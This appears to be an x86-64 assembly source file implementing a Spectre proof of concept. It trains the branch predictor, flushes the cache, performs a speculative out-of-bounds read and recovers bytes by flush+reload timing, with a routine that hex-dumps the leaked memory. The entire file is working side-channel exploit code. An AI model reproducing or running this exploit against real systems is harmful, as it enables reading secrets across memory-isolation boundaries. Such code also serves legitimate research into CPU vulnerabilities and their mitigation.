;input
;  rsi - address
;output:
;  rax - byte result
Spectre_ReadByte:
        push    rbx rcx rdx rsi rdi
        sub     rsp, 32 + 256 * 4
virtual at rsp
  .tries_left rq 1
  .best1 rq 1
  .best2 rq 1
  .hits rd 256
end virtual
        mov     [.tries_left], 50000

        xor     rcx, rcx
.clear_hits:
        mov     dword [.hits + 4 * rcx], 0
        inc     rcx
        cmp     rcx, 256
        jb      .clear_hits

.try_loop:

        ;train branch predictor
        mov     rdi, rsi
        mov     rsi, Spectre_ReadByte
        xor     rax, rax
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte
        call    Spectre_TouchByte

        call    Spectre_FlushMemoryCache

        inc     rax
        mov     rsi, rdi
        call    Spectre_TouchByte

        lea     rdi, [.hits]
        call    Spectre_MeasureMemoryCacheHits
        lea     rdi, [.hits]
        call    Statistics_HighestValues

        mov     [.best1], rax
        mov     [.best2], rdx

        mov     rax, [.best1]
        mov     eax, [.hits + 4 * rax]
        mov     rdx, [.best2]
        mov     edx, [.hits + 4 * rdx]
        add     rdx, rdx
        add     rdx, rdx
        add     rdx, rdx
        add     rdx, 5
        cmp     rax, rdx
        jae     .found_byte  ;if best1 is 8 times more than best2

.not_sure:
        dec     [.tries_left]
        jnz     .try_loop

        mov     rax, [.best1]
;        int3    ; couldn't resolve byte :(
        jmp      .end
.found_byte:
        mov     rax, [.best1]
.end:

        add     rsp, 32 + 256 * 4
        pop     rdi rsi rdx rcx rbx
        ret

;input:
;  rax - condition, zero - normal flow, nonzero for speculative flow
;  rsi - address
;output:
;  rdx - read byte in case of normal flow
Spectre_TouchByte:
        push    rcx
        mov     rcx,400
        loop    $
        ;make cpu think longer about futher condition
        mfence
        clflush byte [Memory_Junk]
        mfence

        cmp     rax, [Memory_Junk]
        jnz     .branch

        movzx   rdx, byte [rsi]
        shl     rdx, CACHE_LINE_SIZE_BITS
        mov     rdx, qword [rdx + memory]
.branch:
        pop     rcx
        ret



Spectre_FlushMemoryCache:
        mfence
        push    rcx rsi

        mov     rsi, memory
        mov     rcx, 256
.loop:
        clflush [rsi]
        add     rsi, CACHE_LINE_SIZE
        loop    .loop

        pop     rsi rcx
        mfence
        ret


;returns
;  rdi - pointer to array of hits (256 * 4 bytes)
Spectre_MeasureMemoryCacheHits:
        push    rax rcx rdx rsi rdi
        xor     rcx, rcx
.loop:
        mov     rdx, rcx
        add     rdx, rdx ; x2
        add     rdx, rdx ; x4
        add     rdx, rcx ; x5
        add     rdx, rdx ; x10
        add     rdx, rdx ; x20
        add     rdx, rcx ; x21
        add     rdx, rdx ; x42
        add     rdx, rdx ; x84
        add     rdx, rdx ; x168
        sub     rdx, rcx ; x167
        add     rdx, 11  ; x167 + 11
        and     rdx, 0xff

        mov     rsi, rdx
        shl     rsi, CACHE_LINE_SIZE_BITS
        add     rsi, memory

        call    Memory_MeasureReadTime
        cmp     rax, [Memory_CutOffTime]
        ja      .cache_miss
        inc     dword [rdi + 4 * rdx]
.cache_miss:

        inc     rcx
        cmp     rcx, 256
        jb      .loop

        pop     rdi rsi rdx rcx rax
        ret


;input
;  rsi - address
;  rcx - length
Spectre_MemoryDumpHex:
        push    rax rbx rcx rdx rsi
        sub     rsp, 40
virtual at rsp
  .bytes rb 16
  .line_start rq 1
  .min rq 1
  .max rq 1
end virtual

        mov     rax, rsi
        mov     [.min], rax
        add     rax, rcx
        mov     [.max], rax

        mov     rax, rsi
        and     rax, not 0x0f
        mov     [.line_start], rax

.lines_loop:
        mov     rsi, [.line_start]
        cmp     rsi, [.max]
        jae     .lines_end

        mov     rax, [.line_start]
        call    Console_WriteUInt64Hex
        mov     al, ':'
        call    Console_WriteChar
        mov     al, ' '
        call    Console_WriteChar

        mov     rsi, [.line_start]
        xor     rcx, rcx
.read_loop:
        cmp     rsi, [.min]
        jb      .read_skip
        cmp     rsi, [.max]
        jae     .read_skip
        call    Spectre_ReadByte
        mov     [.bytes + rcx], al
.read_skip:
        inc     rsi
        inc     rcx
        cmp     rcx, 16
        jb      .read_loop

        mov     rsi, [.line_start]
        xor     rcx, rcx
.line_hex_loop:
        cmp     rsi, [.min]
        jb      .line_hex_empty
        cmp     rsi, [.max]
        jae     .line_hex_empty
        mov     al, [.bytes + rcx]
        call    Console_WriteUInt8Hex
.line_hex_byte_done:
        mov     al, ' '
        call    Console_WriteChar
        mov     rax, rsi
        and     rax, 0x0f
        cmp     rax, 0x07
        jne     .not_mid
        mov     al, ' '
        call    Console_WriteChar
.not_mid:
        inc     rsi
        inc     rcx
        cmp     rcx, 16
        jb      .line_hex_loop
        jmp     .line_hex_done
.line_hex_empty:
        mov     al, ' '
        call    Console_WriteChar
        mov     al, ' '
        call    Console_WriteChar
        jmp     .line_hex_byte_done
.line_hex_done:


        mov     al, '|'
        call    Console_WriteChar
        mov     al, ' '
        call    Console_WriteChar

        mov     rsi, [.line_start]
        xor     rcx, rcx
.line_char_loop:
        cmp     rsi, [.min]
        jb      .line_char_empty
        cmp     rsi, [.max]
        jae     .line_char_empty
        mov     al, [.bytes + rcx]
        cmp     al, 0x20
        jb      .line_char_empty
        call    Console_WriteChar
.line_char_byte_done:
        inc     rsi
        inc     rcx
        cmp     rcx, 16
        jb      .line_char_loop
        jmp     .line_char_done
.line_char_empty:
        mov     al, '.'
        call    Console_WriteChar
        jmp     .line_char_byte_done
.line_char_done:
        mov     al, ' '
        call    Console_WriteChar
        mov     al, '|'
        call    Console_WriteChar

        call    Console_WriteLine
        add     [.line_start], 16
        jmp     .lines_loop

.lines_end:
.end:
        add     rsp, 40
        pop     rsi rdx rcx rbx rax
        ret


Spectre_DumpCacheBenchmark:
        push    rax rsi

        mov     rsi, Memory_HitTimeString
        call    Console_WriteString
        call    Console_WriteLine

        mov     rsi, Memory_MinString
        call    Console_WriteString
        mov     rax, [Memory_HitTimeMin]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_MaxString
        call    Console_WriteString
        mov     rax, [Memory_HitTimeMax]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_MidString
        call    Console_WriteString
        mov     rax, [Memory_HitTime]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_MissTimeString
        call    Console_WriteString
        call    Console_WriteLine

        mov     rsi, Memory_MinString
        call    Console_WriteString
        mov     rax, [Memory_MissTimeMin]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_MaxString
        call    Console_WriteString
        mov     rax, [Memory_MissTimeMax]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_MidString
        call    Console_WriteString
        mov     rax, [Memory_MissTime]
        call    Console_WriteUInt64
        call    Console_WriteLine

        mov     rsi, Memory_CutOffTimeString
        call    Console_WriteString
        mov     rax, [Memory_CutOffTime]
        call    Console_WriteUInt64
        call    Console_WriteLine

        pop     rsi rax
        ret
